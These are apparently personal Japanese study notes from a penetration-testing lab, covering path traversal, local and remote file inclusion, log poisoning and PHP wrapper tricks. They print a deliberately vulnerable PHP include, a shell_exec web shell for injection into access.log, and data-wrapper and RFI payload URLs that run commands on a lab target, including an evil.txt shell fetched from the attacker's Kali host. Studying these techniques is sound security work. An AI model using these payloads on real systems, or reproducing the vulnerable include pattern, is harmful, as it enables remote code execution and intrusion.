## ## 基本情報
トラバーサルの脆弱性がある場合File Inclusionの脆弱性もある可能性が高い

## ## Travarsal
- URLのクエリ文字とフォーム本文を調べるところから始める。
	↑さらにファイル参照を含む箇所を探す。
- 探索する際に一般的に使用されるファイル

### ### LFI
### ### 以下のPHPコードがあった場合にLFIの脆弱性がある。

```php
<?php
$file = $_GET["file"];
include $file; 
?>
```

### ### 悪意のあるファイルを含める方法
1. ファイルをアップロードし、LFIで遷移できるか。
2. ログファイルなどにPHPコードなどの書き込みができるか。

### ### Poisning
- PHPの場合
- 以下のPHPをコードをサーバ側に送り込み、Payloadの箇所の様にブラウザからリクエストを送る。
▼サーバに送る。(access.logに書き込みを行われる。)

```php
' . shell_exec($_GET['cmd']) . '';?>
```

▼Payload
```sh
http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```

### ### PHPラッパー
トラバーサルやLFIの脆弱性をつくために使用できる。
LFIの脆弱性を突く攻撃の際にPHPコードにインジェクションをしようとする、その際に柔軟性を与えてくれる可能性がある。

#### #### ラッパーごとの説明
- data wappers
	URLの一部としてインラインデータを埋め込むことが出来る。
	以下の様な感じでできる。
```sh
http://10.11.0.22/menu.php?file=data:text/plain,hello world
```

![file://C:/Users/alien/AppData/Local/Temp/.B6HJ62/1.png](file://C:/Users/alien/AppData/Local/Temp/.B6HJ62/1.png)
- 悪用コード
```sh
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

![file://C:/Users/alien/AppData/Local/Temp/.B6HJ62/2.png](file://C:/Users/alien/AppData/Local/Temp/.B6HJ62/2.png)

---
## ## RFI
### ### エンドポイント
- すでにLFIが見つかってみる場所
- 以下の様なURLになっている。
	http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
### ### 攻撃手順
  1. Kaliに以下のテキストファイルを保持させる。
```sh
kali@kali:/var/www/html$ cat evil.txt
<?php echo shell_exec($_GET['cmd']); ?>
```

  2. Kaliのブラウザで以下を実行
```
http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
```
